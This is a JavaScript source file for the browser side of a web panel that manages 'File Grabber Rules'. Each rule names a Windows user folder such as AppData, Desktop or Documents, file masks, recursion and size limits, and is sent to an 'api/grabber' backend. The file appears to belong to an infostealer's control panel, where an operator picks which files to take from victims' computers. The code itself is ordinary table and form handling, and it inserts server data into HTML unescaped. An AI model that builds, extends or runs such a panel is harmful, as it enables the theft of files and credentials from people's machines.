var table;

let boundEditRule = null;

var create_rule_modal = new bootstrap.Modal(document.getElementById('create_rule_modal'), 
{
    backdrop: 'static',
    keyboard: false
});

var modal_create_button = document.querySelector('#modal_create_button');

/**
 * datatables
 *
 * 
 * @return none
 */
$(document).ready(function()
{
    table = $('#grabber_table').DataTable(
    {
        dom: '<"top"i>rt<"bottom"lp><"clear">', 
        paging: true,
        pagingType: "full_numbers",
        processing: true,
        serverSide: true,
        ordering: false,
        searching: false,
        pageLength: 25,
        lengthMenu: [ [10, 25, 50, 100, 200], [10, 25, 50, 100, 200] ],
        autoWidth: false,
    
        ajax:
        {
            url: 'api/grabber', 
            type: 'POST',

            data: function (d) 
            {
                d.method                    = "get_rules";
                delete d.columns;
                delete d.search;
            }
        },
    
        columns: 
        [
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `${data.rule_id}`;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `${data.name}`;
                }
            },
                {
                    data: null,
                    "render": function (data, type, row) 
                    {
                        var html = ``;

                        switch(data.csidl)
                        {
                            case "0":// CSIDL_LOCAL_APPDATA
                                html += `%LOCALAPPDATA%`;
                                break;

                            case "1":// CSIDL_APPDATA
                                html += `%APPDATA%`;
                                break;

                            case "2":// CSIDL_DESKTOPDIRECTORY
                                html += `%DESKTOP%`;
                                break;

                            case "3":// CSIDL_PROFILE
                                html += `%USERPROFILE%`;
                                break;

                            case "4":// CSIDL_PERSONAL
                                html += `%DOCUMENTS%`;
                                break;

                            case "5":// CSIDL_PROGRAM_FILES
                                html += `%PROGRAMFILES%`;
                                break;

                            case "6":// CSIDL_PROGRAM_FILESX86
                                html += `%PROGRAMFILES_86%`;
                                break;
                        }

                        html += `${data.start_path}`;

                        return html;
                    }
                },
                {
                    data: null,
                    "render": function (data, type, row) 
                    {
                        return addNewlineAfterComma(data.masks);
                    }
                },
                {
                    data: null,
                    "render": function (data, type, row) 
                    {
                        var html = ``;

                        switch(data.recursive)
                        {
                            case "0":
                                html += `<span class="mb-1 badge text-bg-warning">No</span>`;
                                break;

                            case "1":
                                html += `<span class="mb-1 badge text-bg-primary">Yes</span>`;
                                break;
                        }
                        return html;
                    }
                },
                {
                    data: null,
                    "render": function (data, type, row) 
                    {
                        return `${data.max_size}`;
                    }
                },
                {
                    data: null,
                    "render": function (data, type, row) 
                    {
                        if(data.iterations > 0)
                        {
                            return `${data.iterations}`;
                        }
                        else
                        {
                            return `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M7 7.75a4.25 4.25 0 0 0 0 8.5c.597 0 1.045-.107 1.407-.284c.362-.176.679-.442.986-.816c.54-.66.983-1.558 1.567-2.741q.175-.355.37-.744l.34-.69c.581-1.181 1.117-2.27 1.777-3.075c.41-.501.89-.923 1.49-1.215S16.216 6.25 17 6.25a5.75 5.75 0 1 1-3.45 10.35a.75.75 0 0 1 .9-1.2A4.25 4.25 0 1 0 17 7.75c-.597 0-1.045.107-1.407.284c-.362.176-.679.442-.986.816c-.54.66-.983 1.558-1.567 2.741q-.175.355-.37.744l-.34.69c-.581 1.181-1.117 2.27-1.777 3.076c-.41.5-.89.922-1.49 1.214s-1.28.435-2.063.435A5.75 5.75 0 1 1 10.451 7.4a.75.75 0 1 1-.901 1.2A4.23 4.23 0 0 0 7 7.75" clip-rule="evenodd"/></svg>`;
                        }
                    }
                },
                {
                    data: null,
                    "render": function (data, type, row) 
                    {
                        switch(data.active)
                        {
                            case "0":
                                return `<span class="mb-1 badge text-bg-danger">Disabled</span>`;
                                break;

                            case "1":
                                return `<span class="mb-1 badge text-bg-primary">Active</span>`;
                                break;
                        }
                    }
                },
                {
                    data: null,
                    "render": function (data, type, row) 
                    {
                        return `
                        <div class="btn-group">
                            <button class="btn btn-primary dropdown-toggle" type="button" id="dropdownMenuButton" data-bs-toggle="dropdown" aria-expanded="false">Actions</button>
                            
                            <ul class="dropdown-menu" aria-labelledby="dropdownMenuButton" style="">
                                <li>
                                    <a class="dropdown-item" href="javascript:void(0)" onclick="ChangeStatus('${data.rule_id}', '${data.active == 1 ? '0' : '1'}')">${data.active == 1 ? 'Disable' : 'Enable'}</a>
                                </li>
                                <li>
                                    <a class="dropdown-item" href="javascript:void(0)" onclick="EditRule('${data.rule_id}');" >Edit</a>
                                </li>
                                <li>
                                    <hr class="dropdown-divider">
                                </li>
                                <li>
                                    <a class="dropdown-item" href="javascript:void(0)" onclick="DeleteRule('${data.rule_id}')">Delete</a>
                                </li>
                            </ul>
                        </div>
                        `;
                    }
                }
            ]
        });
});

function addNewlineAfterComma(str) 
{
    return str.replace(/,/g, ',<br>');
}

/**
 * createRuleModal
 *
 * 
 *
 * @return none
 */
function createRuleModal()
{
    document.getElementById("modal_create_rule_header").innerText = "Create File Grabber Rule";

    modal_create_button.removeEventListener('click', boundEditRule);

    modal_create_button.innerText = "Create";

    document.getElementById("create_rule_name").value = "";
    document.getElementById("create_rule_masks").value = "";
    document.getElementById("create_rule_start_path").value = "";
    document.getElementById("create_rule_iterations").value = "";
    document.getElementById("create_rule_max_size").value = "";
    $('#create_rule_csidl').val(2);
    $('#create_rule_recursive').val(1);

    create_rule_modal.show();
    modal_create_button.addEventListener('click', handleCreateRule);
}

function handleCreateRule()
{
    var rule_name           = document.getElementById("create_rule_name").value;
    var rule_csidl          = document.getElementById("create_rule_csidl").value;
    var rule_start_path     = document.getElementById("create_rule_start_path").value;
    var rule_masks          = document.getElementById("create_rule_masks").value;
    var rule_recursive      = document.getElementById("create_rule_recursive").value;
    var rule_iterations     = document.getElementById("create_rule_iterations").value;
    var rule_max_size       = document.getElementById("create_rule_max_size").value;

    if (rule_name.trim().length > 0 & rule_masks.trim().length > 0 & rule_max_size.trim().length > 0)
    {
        $.post('api/grabber', 
        { 
            method:             'create_rule',
            rule_name:          rule_name,
            rule_csidl:         rule_csidl,
            rule_start_path:    rule_start_path,
            rule_masks:         rule_masks.replace(/\r?\n/g, ','),
            rule_recursive:     rule_recursive,
            rule_iterations:    rule_iterations,
            rule_max_size:      rule_max_size
        },
        function(response) 
        {
            if (response.success)
            {
                table.draw();
                create_rule_modal.hide();
    
                toastr.info(response.success);
                modal_create_button.removeEventListener('click', handleCreateRule);
            }
            else
            {
                toastr.warning(response.error);
            }
        }, 'json');
    }
    else
    {
        toastr.error("Error: Enter Name, Masks and Max Size");
    }
}

function DeleteRule(rule_id)
{
    $.post('api/grabber', 
    { 
        method: 'delete_rule',
        rule_id: rule_id
    },
    function(response) 
    {
        if (response.success)
        {
            table.draw();
            toastr.info(response.success);
        }
        else
        {
            toastr.warning(response.error);
        }
    }, 'json');
}

function ChangeStatus(rule_id, rule_active)
{
    $.post('api/grabber', 
    { 
        method: 'change_status',
        rule_id: rule_id,
        rule_active: rule_active
    },
    function(response) 
    {
        if (response.success)
        {
            table.draw();
            toastr.info(response.success);
        }
        else
        {
            toastr.warning(response.error);
        }
    }, 'json');
}

function EditRule(rule_id)
{
    modal_create_button.removeEventListener('click', handleCreateRule);

    $.post('api/grabber', 
    { 
        method: 'get_rule',
        rule_id: rule_id
    },
    function(response)
    {
        if (response.success) 
        {
            document.getElementById("modal_create_rule_header").innerText = "Edit Rule #" + rule_id;

            document.getElementById("create_rule_name").value = response.data.name;
            document.getElementById("create_rule_masks").value = response.data.masks;
            document.getElementById("create_rule_start_path").value = response.data.start_path;
            document.getElementById("create_rule_iterations").value = response.data.iterations;
            document.getElementById("create_rule_max_size").value = response.data.max_size;
            $('#create_rule_csidl').val(response.data.csidl);
            $('#create_rule_recursive').val(response.data.recursive);

            modal_create_button.innerText = "Save";

            boundEditRule = handleEditRule.bind(null, rule_id);

            modal_create_button.addEventListener('click',  boundEditRule);

            create_rule_modal.show();
        }
        else
        {
            toastr.error(response.error);
        }
    },
        'json'
    );
}

function handleEditRule(rule_id)
{
    var rule_name           = document.getElementById("create_rule_name").value;
    var rule_csidl          = document.getElementById("create_rule_csidl").value;
    var rule_start_path     = document.getElementById("create_rule_start_path").value;
    var rule_masks          = document.getElementById("create_rule_masks").value;
    var rule_recursive      = document.getElementById("create_rule_recursive").value;
    var rule_iterations     = document.getElementById("create_rule_iterations").value;
    var rule_max_size       = document.getElementById("create_rule_max_size").value;

    if (rule_name.trim().length > 0 & rule_masks.trim().length > 0 & rule_max_size.trim().length > 0)
    {
        $.post('api/grabber', 
            { 
                method:             'edit_rule',
                rule_id:            rule_id,
                rule_name:          rule_name,
                rule_csidl:         rule_csidl,
                rule_start_path:    rule_start_path,
                rule_masks:         rule_masks,
                rule_recursive:     rule_recursive,
                rule_iterations:    rule_iterations,
                rule_max_size:      rule_max_size
            },
            function(response) 
            {
                if (response.success)
                {
                    table.draw();
                    create_rule_modal.hide();
        
                    toastr.info(response.success);
                    modal_create_button.removeEventListener('click', handleEditRule);
                }
                else
                {
                    toastr.warning(response.error);
                }
            }, 'json');
    }
    else
    {
        toastr.error("Error: Enter Name, Masks and Max Size");
    }
}